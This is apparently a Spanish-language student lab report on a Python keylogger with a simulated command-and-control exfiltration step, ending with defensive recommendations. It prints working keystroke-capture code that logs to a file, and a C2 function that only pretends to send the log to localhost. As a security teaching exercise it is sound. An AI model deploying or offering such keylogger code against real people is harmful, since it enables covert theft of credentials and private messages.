Evidencia de Ejecución

Fundamentos Técnicos

¿Qué diferencia a este keylogger del de la Actividad 12? Además de capturar pulsaciones en tiempo real, incorpora persistencia en archivo local (bitácora .txt) y un canal de exfiltración simulada hacia un servidor C2 (Command & Control), replicando la fase de transmisión de datos en un ataque real.
¿Qué es un servidor C2? Command & Control. Infraestructura remota operada por un atacante para recibir datos robados, enviar comandos y administrar equipos comprometidos. Es el núcleo operativo de la mayoría del malware avanzado (APTs).
¿Para qué sirve flush=True en print()? Fuerza la escritura inmediata en la consola sin esperar a que se llene el buffer de salida. Esto permite ver cada tecla en tiempo real mientras se captura, útil para monitoreo en vivo durante pruebas de penetración.
¿Cómo se manejan las teclas especiales en este script? Se implementa un mapeo manual dentro del bloque except AttributeError: Key.space se traduce como espacio en blanco, Key.enter como salto de línea (\n), Key.tab como etiqueta [TAB], y cualquier otra tecla especial se envuelve entre corchetes para legibilidad.
¿Por qué se usa modo "a" en open()? Append. Abre el archivo en modo agregar, colocando el cursor al final sin truncar el contenido previo. Esto garantiza que cada nueva pulsación se sume al historial completo de la sesión de captura.

Análisis de Componentes del Código

Componente Función Propósito en el Ataque
LOG_FILE Archivo local de bitácora (.txt) Persistencia de datos capturados en disco
C2_URL Endpoint de recepción simulado Destino de la exfiltración de información
enviar_al_c2() Lectura del log y envío simulado Fase de transmisión del ciclo del malware
open(..., "a") Apertura en modo append Acumulación de pulsaciones sin pérdida de datos
flush=True Escritura inmediata en stdout Visualización en tiempo real del keylogger
Key.esc Trigger de finalización Condición de salida que activa la exfiltración

Estructura del Script

# Importación de librerías para manipulación de archivos y teclado import os from pynput.keyboard import Key, Listener # Configuración de rutas y endpoint C2 LOG_FILE = "174702ctiv13.txt" C2_URL = "http://localhost:8080/report" # Función de exfiltración: lee el log y simula envío al servidor def enviar_al_c2(): if os.path.exists(LOG_FILE): try: with open(LOG_FILE, 'r', encoding='utf-8') as f: datos = f.read() print(f"\n[+] Enviando reporte a: {C2_URL}") print("[+] Log enviado correctamente al C2.") except Exception as e: print(f"[-] Error en comunicación: {e}") # Callback de pulsación: captura, formatea y escribe a disco def on_press(key): try: tecla = str(key.char) except AttributeError: if key == Key.space: tecla = " " elif key == Key.enter: tecla = "\n" elif key == Key.tab: tecla = "[TAB]" else: tecla = f" [{key}] " print(tecla, end="", flush=True) with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(tecla) # Callback de liberación: ESC detiene el listener y activa C2 def on_release(key): if key == Key.esc: print("\n[*] Finalizando captura...") enviar_al_c2() return False

Reflexión Técnica

La diferencia entre un keylogger local y uno con capacidad de red radica en la escalada de impacto. Mientras la Actividad 12 se limitaba a la observación pasiva, esta práctica introduce la exfiltración de datos: la fase final del ciclo de vida del malware donde la información robada abandona el perímetro de la víctima.

La simulación del canal C2 pone en evidencia por qué las organizaciones deben implementar Data Loss Prevention (DLP), inspección de tráfico saliente y monitoreo de creación de archivos sospechosos. Un atacante real no necesitaría volver a tocar la máquina comprometida; con solo una conexión saliente, ya posee las credenciales y conversaciones capturadas.

Desde la perspectiva defensiva, este ejercicio valida la importancia de los EDR (Endpoint Detection and Response), reglas de firewall outbound y el principio de mínimo privilegio: si el proceso no necesita acceso a red, no debe tenerlo.
